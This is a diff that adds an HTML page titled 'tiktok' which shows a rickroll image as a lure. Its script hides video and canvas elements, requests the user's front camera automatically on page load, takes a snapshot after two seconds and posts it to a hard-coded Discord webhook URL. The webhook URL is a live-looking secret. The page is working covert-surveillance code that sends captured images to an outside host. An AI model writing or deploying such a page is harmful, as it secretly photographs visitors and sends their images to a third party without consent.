@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>tiktok</title>
+    <style>
+        /* Centered overlay for rickroll image */
+        #overlay {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 300px;  /* Set the desired width */
+            height: 300px; /* Set the desired height */
+            background-image: url('rickroll.png');
+            background-size: contain; /* Adjust to fit within width and height */
+            background-repeat: no-repeat;
+            background-position: center;
+            z-index: 9999; /* Keep it on top */
+        }
+
+        /* Hide video and canvas elements */
+        #video, #canvas {
+            display: none;
+        }
+
+        /* Styling for snapshot if you want to display it */
+        #snapshot {
+            width: 100%;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <!-- Overlay for displaying the smaller rickroll image -->
+    <div id="overlay"></div>
+
+    <!-- Hidden elements for capturing and displaying snapshots -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    <img id="snapshot" style="display: none;"/>
+
+    <script>
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1299390747711373334/iO5Sbk83deMgQEYd8YfesE-jcYQmL2fudZcdiGuuJUCUZe95-1gNs4VbmYd6mM2qAJhJ";
+
+        // Start the camera automatically when the page loads
+        window.onload = async () => {
+            await startCamera();
+        };
+
+        async function startCamera() {
+            // Check if getUserMedia is supported
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                console.error('getUserMedia not supported on this browser or device.');
+                alert('Camera access is not supported in this browser or device.');
+                return;
+            }
+
+            try {
+                const video = document.getElementById('video');
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                video.srcObject = stream;
+
+                // Capture snapshot after a short delay
+                setTimeout(() => takeSnapshot(stream), 2000);
+            } catch (error) {
+                console.error('Error accessing the camera:', error);
+                alert('Error accessing the camera: ' + error.message);
+            }
+        }
+
+        function takeSnapshot(stream) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            // Set canvas dimensions to video dimensions
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Draw video frame to canvas and get image data
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+
+            // Stop video stream after capture
+            stream.getTracks().forEach(track => track.stop());
+
+            // Display the snapshot
+            document.getElementById('snapshot').src = imageData;
+
+            // Send the image to Discord
+            uploadImageToDiscord(imageData);
+        }
+
+        async function uploadImageToDiscord(imageData) {
+            // Convert the base64 image to a Blob
+            const blob = await fetch(imageData).then(res => res.blob());
+
+            // Prepare the form data to be sent to Discord
+            const formData = new FormData();
+            formData.append('file', blob, 'snapshot.png');
+            formData.append('content', 'New snapshot captured.');
+
+            try {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    console.log('Image successfully sent to Discord.');
+                } else {
+                    console.error('Failed to send image to Discord:', response.statusText);
+                }
+            } catch (error) {
+                console.error('Error uploading image to Discord:', error);
+            }
+        }
+    </script>
+</body>
+</html>
